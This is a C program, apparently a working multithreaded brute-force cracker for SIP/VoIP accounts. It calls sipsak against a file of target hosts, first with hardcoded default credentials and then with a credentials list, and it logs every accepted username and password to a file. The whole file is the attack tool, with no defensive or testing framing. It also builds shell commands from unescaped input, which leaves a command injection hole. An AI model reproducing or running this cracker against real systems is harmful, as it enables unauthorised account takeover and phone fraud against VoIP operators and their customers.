#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <signal.h>

#define MAX_LINE 512
#define COMMAND_SIZE 2048
#define DEFAULT_USERNAME "MoH123"
#define DEFAULT_PASSWORD "MoHmOh123544"

typedef struct {
    char target[MAX_LINE];
    char protocol[5];
} ThreadData;

char **blocklist_data = NULL;
int blocklist_count = 0;

int is_target_in_blocklist(const char *target) {
    for (int i = 0; i < blocklist_count; i++) {
        if (strcmp(target, blocklist_data[i]) == 0) {
            return 1;
        }
    }
    return 0;
}

void load_blocklist() {
    FILE *blocklist = fopen("blocklist.txt", "a+");  // Open for append and reading, create if doesn't exist
    if (!blocklist) {
        perror("Failed to open blocklist file");
        exit(1);
    }

    char line[MAX_LINE];
    while (fgets(line, sizeof(line), blocklist)) {
        blocklist_data = realloc(blocklist_data, (blocklist_count + 1) * sizeof(char *));
        blocklist_data[blocklist_count] = strdup(line);
        strtok(blocklist_data[blocklist_count], "\n");  // Remove newline
        blocklist_count++;
    }
    fclose(blocklist);
}

void free_blocklist() {
    for (int i = 0; i < blocklist_count; i++) {
        free(blocklist_data[i]);
    }
    free(blocklist_data);
}

void timer_handler(int signum) {
    pthread_exit(NULL);
}

void *try_login(void *arg) {
    ThreadData *data = (ThreadData *)arg;
    
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = &timer_handler;
    sigaction(SIGALRM, &sa, NULL);
    alarm(5);  // Set the timer for two seconds

    if (is_target_in_blocklist(data->target)) {
        free(data);
        return NULL;
    }

    char command[COMMAND_SIZE];
    char output[COMMAND_SIZE];

    char protocol_option[64];
    if (strcmp(data->protocol, "udp") == 0) {
        strcpy(protocol_option, "udp");
    } else if (strcmp(data->protocol, "tcp") == 0) {
        strcpy(protocol_option, "tcp");
    } else if (strcmp(data->protocol, "tls") == 0) {
        strcpy(protocol_option, "tls --tls-ignore-cert-failure");
    } else {
        fprintf(stderr, "Unsupported protocol: %s\n", data->protocol);
        free(data);
        return NULL;
    }

    // Try the default username and password first
    snprintf(command, sizeof(command), "sipsak -U %s -C sip:%s@home.com --from sip:%s@%s -u %s -a %s -p %s -s sip:%s@%s -i -vvv -E %s",
             protocol_option, DEFAULT_USERNAME, DEFAULT_USERNAME, data->target, DEFAULT_USERNAME, DEFAULT_PASSWORD, data->target, DEFAULT_USERNAME, data->target, data->protocol);

    FILE *cmd_output = popen(command, "r");
    int is_default_accepted = 0;
    while (fgets(output, sizeof(output), cmd_output)) {
        if (strstr(output, "200 OK") || strstr(output, "202 Accepted") || strstr(output, "204 No Notification")) {
            is_default_accepted = 1;
            FILE *blocklist = fopen("blocklist.txt", "a");
            if (blocklist) {
                fprintf(blocklist, "%s\n", data->target);
                fclose(blocklist);
            }
            break;
        }
    }
    pclose(cmd_output);

    // If default credentials were accepted, return early
    if (is_default_accepted) {
        free(data);
        return NULL;
    }

    // Now try credentials from credentials.txt
    FILE *credentials = fopen("credentials.txt", "r");
    char credential_line[MAX_LINE];

    if (!credentials) {
        perror("Failed to open credentials file");
        free(data);
        return NULL;
    }

    while (fgets(credential_line, sizeof(credential_line), credentials)) {
        strtok(credential_line, "\n");  // Remove newline

        char *username = strtok(credential_line, ":");
        char *password = strtok(NULL, ":");

        snprintf(command, sizeof(command), "sipsak -U %s -C sip:%s@home.com --from sip:%s@%s -u %s -a %s -p %s -s sip:%s@%s -i -vvv -E %s",
                protocol_option, username, username, data->target, username, password, data->target, username, data->target, data->protocol);
				
        cmd_output = popen(command, "r");
        while (fgets(output, sizeof(output), cmd_output)) {
            if (strstr(output, "200 OK") || strstr(output, "202 Accepted") || strstr(output, "204 No Notification")) {
                FILE *success_log = fopen("successful_logins.txt", "a");
                if (success_log) {
                    fprintf(success_log, "Target: %s, Username: %s, Password: %s\n", data->target, username, password);
                    fclose(success_log);
                }
                break;
            }
        }
        pclose(cmd_output);
    }

    fclose(credentials);
    free(data);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <protocol> <threads> <targets_file>\n", argv[0]);
        return 1;
    }

    load_blocklist();

    char *protocol = argv[1];
    int max_threads = atoi(argv[2]);
    char *targets_file = argv[3];

    FILE *targets = fopen(targets_file, "r");
    if (!targets) {
        perror("Failed to open targets file");
        free_blocklist();
        return 1;
    }

    pthread_t threads[max_threads];
    int current_thread = 0;
    char target_line[MAX_LINE];

    while (fgets(target_line, sizeof(target_line), targets)) {
        strtok(target_line, "\n");  // Remove newline

        ThreadData *data = malloc(sizeof(ThreadData));
        strncpy(data->target, target_line, sizeof(data->target) - 1);
        strncpy(data->protocol, protocol, sizeof(data->protocol) - 1);

        pthread_create(&threads[current_thread], NULL, try_login, data);
        current_thread++;

        if (current_thread >= max_threads) {
            for (int i = 0; i < max_threads; i++) {
                pthread_join(threads[i], NULL);
            }
            current_thread = 0;
        }
    }

    // Join any remaining threads
    for (int i = 0; i < current_thread; i++) {
        pthread_join(threads[i], NULL);
    }

    fclose(targets);
    free_blocklist();

    printf("Cracking process completed successfully!\n");
    
    return 0;
}
